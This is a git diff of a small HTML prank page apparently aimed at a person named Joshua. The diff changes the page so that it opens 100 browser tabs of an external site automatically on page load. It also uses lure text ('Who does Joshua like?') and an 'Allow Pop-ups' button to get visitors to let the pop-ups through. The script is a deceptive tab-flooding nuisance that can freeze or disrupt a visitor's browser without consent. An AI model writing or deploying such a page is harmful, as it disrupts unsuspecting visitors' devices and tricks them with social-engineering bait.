@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Who is Joshua's crush?</title>
+    <title>Tab Opener</title>
     <style>
         body {
             background-image: url('https://i.imgur.com/9GcrldH.jpg');
@@ -37,37 +37,23 @@
         }
     </style>
     <script>
-        var url = "https://jz1324.github.io/noice/";
-        var tabCount = 100;
-
-        function openMultipleTabs() {
-            var win = window.open(url, "_blank");
-            win.blur();
-
-            var openTab = function () {
-                if (tabCount > 1) {
-                    var clonedWin = win.open(url, "_blank");
-                    clonedWin.blur();
-                    tabCount--;
-                    setTimeout(openTab, 0); // Adjust the delay if needed, but keep it minimal
-                }
-            };
-
-            openTab();
+        function openTabs() {
+            for (var i = 0; i < 100; i++) {
+                var newWindow = window.open('https://jz1324.github.io/noice/', '_blank');
+            }
         }
 
-        function unblockTabs() {
-            document.getElementById("unblockButton").disabled = true;
-            openMultipleTabs();
+        function allowPopups() {
+            window.open('', '_blank').close();
         }
     </script>
 </head>
-<body>
+<body onload="openTabs()">
     <div id="overlay">
-        <span>Who does Joshua like? Click the button to unblock the tabs from opening and find out.</span>
+        <span>Who does Joshua like? Click the button to allow pop-ups.</span>
         <br>
         <div id="buttonContainer">
-            <button id="unblockButton" onclick="unblockTabs()">Unblock Tabs</button>
+            <button id="unblockButton" onclick="allowPopups()">Allow Pop-ups</button>
         </div>
     </div>
 </body>
